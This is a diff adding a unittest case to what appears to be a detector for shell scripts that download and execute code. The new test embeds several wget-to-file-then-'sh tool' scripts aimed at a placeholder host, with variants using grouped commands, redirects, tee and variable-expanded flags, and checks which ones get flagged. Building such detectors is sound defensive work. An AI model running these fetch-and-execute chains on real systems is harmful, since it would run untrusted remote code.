@@ -6025,6 +6025,41 @@ class TestACompoundCommandCarriesItsClosingOutput(unittest.TestCase):
         for follower in followers:
             self.assert_clean_in_every_shell(nested + follower % self.FETCH)
 
+    def test_3069_an_inherited_output_keeps_wgets_expansion_unresolved(self):
+        url = "https://example.test/i.sh"
+        group_redirect = "X=-qO-\n{ wget $X %s; } > tool\nsh tool\n" % url
+        group_tee = "X=-qO-\n{ wget $X %s; } | tee tool\nsh tool\n" % url
+        group_discard = ("X='-O tool'\n{ wget $X %s; } > /dev/null\n"
+                         "sh tool\n") % url
+        reports = (
+            ("r3087.x.def-grp-wgetX-redir", "f() { :; }\n" + group_redirect),
+            ("r3087r2.x.def-qO-grp-redir", "f() { :; }\n" + group_redirect),
+            ("r3087r2.x.def-tee", "f() { :; }\n" + group_tee),
+            ("r3087r2.x.def-O-grp-devnull", "f() { :; }\n" + group_discard),
+            ("r3087r2.x.defif-qO-grp-redir",
+             "f() { if true; then :; fi; }\n" + group_redirect),
+            ("r3087r3.twin.qO-grp-redir", group_redirect),
+            ("r3087r3.twin.qO-grp-tee", group_tee),
+            ("r3087r3.twin.O-grp-devnull", group_discard),
+            # #3034's accepted price: the expansion may name a destination;
+            # under X=-qO- this harmless inherited pipe would run no `tool`.
+            ("r3087r3.price.grp-cat",
+             "X=-qO-\n{ wget $X %s; } | cat\nsh tool\n" % url),
+        )
+        for row, script in reports:
+            with self.subTest(row=row):
+                self.assert_reported_in_every_shell(script)
+
+        # Only an enclosing compound's route keeps the fail-closed #3034
+        # reading. A fetch stage's own redirects and pipe stay #3035's limit.
+        own_outputs = (
+            "X=-qO-\nwget $X %s > tool\nsh tool\n" % url,
+            "X=-qO-\nwget $X %s | tee tool\nsh tool\n" % url,
+            "X='-O tool'\nwget $X %s > /dev/null\nsh tool\n" % url,
+        )
+        for script in own_outputs:
+            self.assert_clean_in_every_shell(script)
+
     def test_a_redirected_compound_does_not_hide_an_inner_subshell_stream(self):
         for script in (
                 "{ ( %s; ) | sh; } > log\n" % self.FETCH,
